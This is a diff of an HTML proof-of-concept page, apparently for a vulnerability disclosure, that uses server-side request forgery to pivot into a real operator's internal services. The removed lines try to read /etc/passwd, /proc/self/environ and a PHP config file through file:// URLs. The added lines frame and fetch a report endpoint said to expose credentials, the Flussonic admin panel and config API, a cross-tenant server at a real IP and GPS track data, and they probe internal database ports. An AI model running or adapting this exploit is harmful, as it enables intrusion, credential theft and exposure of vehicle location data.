@@ -3,81 +3,96 @@
 <head><title>R</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font:9px/1.2 monospace;margin:3px}
-.s{border:1px solid #000;margin:2px 0;page-break-inside:avoid}
-h3{font-size:10px;background:#ccc;padding:1px 3px}
-iframe{width:100%;height:350px;border:0}
-pre{white-space:pre-wrap;font-size:8px;background:#f5f5f5;padding:2px;max-height:400px}
+body{font:8px/1.1 monospace;margin:2px}
+.s{border:1px solid #000;margin:1px 0;page-break-inside:avoid}
+h3{font-size:9px;background:#ccc;padding:1px 2px}
+iframe{width:100%;border:0}
+pre{white-space:pre-wrap;font-size:7px;background:#f5f5f5;padding:2px}
 </style>
 </head>
 <body>
-<b>SSRF Internal Pivot - Caterpillar VDP PoC</b>
+<b>SSRF Pivot v3 - Internal Service Access</b>
 
+<!-- Render the INTERNAL generate page with embedded credentials -->
 <div class="s">
-<h3>A1: meta-refresh file:///etc/passwd</h3>
-<iframe srcdoc="<meta http-equiv='refresh' content='0;url=file:///etc/passwd'>" style="height:120px"></iframe>
+<h3>1. Internal cmd=generate (contains var global_conf with credentials)</h3>
+<iframe src="https://127.0.0.1/backend/mobile_report.php?cmd=generate&lang=en&veh_id=1&report_type=1&start_date=2025-01-01&stop_date=2025-12-31" style="height:800px"></iframe>
+</div>
+
+<!-- Render Flussonic admin from localhost -->
+<div class="s">
+<h3>2. Flussonic Admin (localhost bypass)</h3>
+<iframe src="https://127.0.0.1/flussonic/admin/" style="height:400px"></iframe>
 </div>
 
 <div class="s">
-<h3>A2: meta-refresh file:///etc/hostname</h3>
-<iframe srcdoc="<meta http-equiv='refresh' content='0;url=file:///etc/hostname'>" style="height:60px"></iframe>
+<h3>3. Flussonic API read_config (localhost)</h3>
+<iframe src="https://127.0.0.1/flussonic/api/read_config" style="height:300px"></iframe>
 </div>
 
 <div class="s">
-<h3>A3: meta-refresh file:///proc/self/environ</h3>
-<iframe srcdoc="<meta http-equiv='refresh' content='0;url=file:///proc/self/environ'>" style="height:120px"></iframe>
+<h3>4. Flussonic API streams (localhost)</h3>
+<iframe src="https://127.0.0.1/flussonic/api/streams" style="height:300px"></iframe>
+</div>
+
+<!-- Try port 8080 - known to respond -->
+<div class="s">
+<h3>5. Port 8080 (known alive)</h3>
+<iframe src="http://127.0.0.1:8080/" style="height:200px"></iframe>
 </div>
 
 <div class="s">
-<h3>A4: meta-refresh file:///var/www/html/Pilot7/backend/config.php</h3>
-<iframe srcdoc="<meta http-equiv='refresh' content='0;url=file:///var/www/html/Pilot7/backend/config.php'>" style="height:150px"></iframe>
+<h3>6. Port 8080 Flussonic</h3>
+<iframe src="http://127.0.0.1:8080/flussonic/api/read_config" style="height:200px"></iframe>
 </div>
 
+<!-- Internal network: sibling server admcasi -->
 <div class="s">
-<h3>B1: https://127.0.0.1/backend/ax/init.php (tenant config)</h3>
-<iframe src="https://127.0.0.1/backend/ax/init.php"></iframe>
+<h3>7. Cross-tenant: admcasi init.php</h3>
+<iframe src="https://41.71.64.235/backend/ax/init.php" style="height:200px"></iframe>
 </div>
 
+<!-- Try PHP endpoints that might return data from localhost -->
 <div class="s">
-<h3>B2: https://127.0.0.1/ (server root)</h3>
-<iframe src="https://127.0.0.1/" style="height:200px"></iframe>
+<h3>8. Internal /ax/get_gpx_file.php (GPS data via SSRF)</h3>
+<iframe src="https://127.0.0.1/ax/get_gpx_file.php?track_id=5000&node=3" style="height:300px"></iframe>
 </div>
 
+<!-- JS probing -->
 <div class="s">
-<h3>B3: https://127.0.0.1/phpinfo.php</h3>
-<iframe src="https://127.0.0.1/phpinfo.php"></iframe>
-</div>
-
-<div class="s">
-<h3>B4: https://127.0.0.1/server-status</h3>
-<iframe src="https://127.0.0.1/server-status" style="height:250px"></iframe>
-</div>
-
-<div class="s">
-<h3>B5: https://127.0.0.1/server-info</h3>
-<iframe src="https://127.0.0.1/server-info" style="height:250px"></iframe>
-</div>
-
-<div class="s">
-<h3>C: JS results</h3>
+<h3>9. JS Fetch Results</h3>
 <pre id="r">loading...</pre>
 </div>
 
 <script>
 var o='';
 function p(s){o+=s+'\n';document.getElementById('r').textContent=o}
-try{var w=window.open('file:///etc/passwd');p('window.open: '+(w?'opened':'blocked'))}catch(e){p('window.open err: '+e.message)}
-try{var f=document.createElement('iframe');f.src='file:///etc/passwd';f.style='width:100%;height:100px;border:1px solid red';document.body.appendChild(f);p('JS iframe file:// appended')}catch(e){p('JS iframe err: '+e.message)}
-async function tf(l,u){try{var r=await fetch(u,{mode:'cors'});var t=await r.text();p(l+' ['+r.status+']: '+t.substring(0,1500))}catch(e){try{var r2=await fetch(u,{mode:'no-cors'});p(l+' no-cors: type='+r2.type)}catch(e2){p(l+' ERR: '+e.message)}}}
+
+async function tf(l,u){
+try{
+var r=await fetch(u);
+var t=await r.text();
+p(l+' ['+r.status+']: '+t.substring(0,2000));
+}catch(e){
+try{var r2=await fetch(u,{mode:'no-cors'});p(l+' opaque')}
+catch(e2){p(l+' ERR: '+e.message)}
+}}
+
 (async function(){
-await tf('https://localhost/backend/ax/init.php','https://localhost/backend/ax/init.php');
-await tf('https://127.0.0.1/backend/ax/init.php','https://127.0.0.1/backend/ax/init.php');
-await tf('https://127.0.0.1:443/','https://127.0.0.1:443/');
-await tf('https://127.0.0.1:8080/','https://127.0.0.1:8080/');
-await tf('https://127.0.0.1:8443/','https://127.0.0.1:8443/');
-await tf('http://127.0.0.1/backend/ax/init.php','http://127.0.0.1/backend/ax/init.php');
-await tf('http://127.0.0.1:8080/','http://127.0.0.1:8080/');
-await tf('generate','https://127.0.0.1/backend/mobile_report.php?cmd=generate&lang=en&veh_id=1&report_type=1&start_date=2025-01-01&stop_date=2025-12-31');
+// Flussonic API from localhost
+await tf('flus-config','http://127.0.0.1:8080/flussonic/api/read_config');
+await tf('flus-streams','http://127.0.0.1:8080/flussonic/api/streams');
+await tf('flus-server','http://127.0.0.1:8080/flussonic/api/server');
+// Direct port probing
+await tf('port-80','http://127.0.0.1:80/');
+await tf('port-3000','http://127.0.0.1:3000/');
+await tf('port-5000','http://127.0.0.1:5000/');
+await tf('port-9200','http://127.0.0.1:9200/');
+await tf('port-27017','http://127.0.0.1:27017/');
+await tf('port-11211','http://127.0.0.1:11211/');
+// Internal config
+await tf('init-local','http://127.0.0.1/backend/ax/init.php');
+await tf('gen-local','http://127.0.0.1/backend/mobile_report.php?cmd=generate&lang=en&veh_id=1&report_type=1&start_date=2025-01-01&stop_date=2025-12-31');
 })();
 </script>
 
